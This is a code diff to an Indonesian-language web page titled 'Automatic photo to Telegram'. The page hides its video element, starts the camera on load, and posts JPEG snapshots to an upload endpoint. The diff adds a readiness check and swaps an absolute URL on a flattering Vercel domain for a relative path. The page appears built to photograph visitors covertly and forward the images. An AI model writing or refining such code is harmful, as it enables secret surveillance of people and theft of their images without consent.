@@ -3,6 +3,7 @@
 <head>
   <meta charset="utf-8"/>
   <title>Foto Otomatis ke Telegram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <style>
     body { font-family:sans-serif; display:flex; flex-direction:column; align-items:center; padding:24px; }
     video { display:none; }
@@ -32,6 +33,11 @@
     startCam();
 
     async function captureAndSend() {
+      if (!video || !video.videoWidth) {
+        console.error('Video belum siap');
+        return;
+      }
+
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
@@ -40,13 +46,14 @@
       const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
       try {
-        // Pakai absolute URL deploy final
-        const res = await fetch('https://kamukayaknyaganteng121.vercel.app/api/upload', {
+        const res = await fetch('/api/upload', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ image: dataUrl })
         });
-        console.log(await res.text());
+
+        const text = await res.text();
+        console.log('Response /api/upload:', res.status, text);
       } catch (err) {
         console.error('Gagal kirim:', err);
       }
